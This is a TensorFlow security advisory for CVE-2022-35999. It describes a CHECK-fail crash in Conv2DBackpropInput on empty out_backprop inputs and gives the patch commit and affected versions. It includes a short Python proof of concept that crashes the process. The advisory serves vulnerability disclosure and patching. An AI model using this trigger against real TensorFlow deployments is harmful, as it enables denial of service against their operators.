<h2>TFSA-2022-121: <code>CHECK</code> fail in <code>Conv2DBackpropInput</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-35999</p>
<h3>Impact</h3>
<p>When <code>Conv2DBackpropInput</code> receives empty <code>out_backprop</code> inputs (e.g. <code>[3, 1, 0, 1]</code>), the current CPU/GPU kernels <code>CHECK</code> fail (one with dnnl, the other with cudnn). This can be used to trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np
input_sizes = [3, 1, 1, 2]
filter = np.ones([1, 3, 2, 3])
out_backprop = np.ones([3, 1, 0, 3])
strides = [1, 1, 2, 1]
padding = 'VALID'</p>
<p>tf.raw_ops.Conv2DBackpropInput(
   input_sizes = input_sizes,
   filter = filter,
   out_backprop = out_backprop,
   strides = strides,
   padding = padding
)
```</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/27a65a43cf763897fecfa5cdb5cc653fc5dd0346">27a65a43cf763897fecfa5cdb5cc653fc5dd0346</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
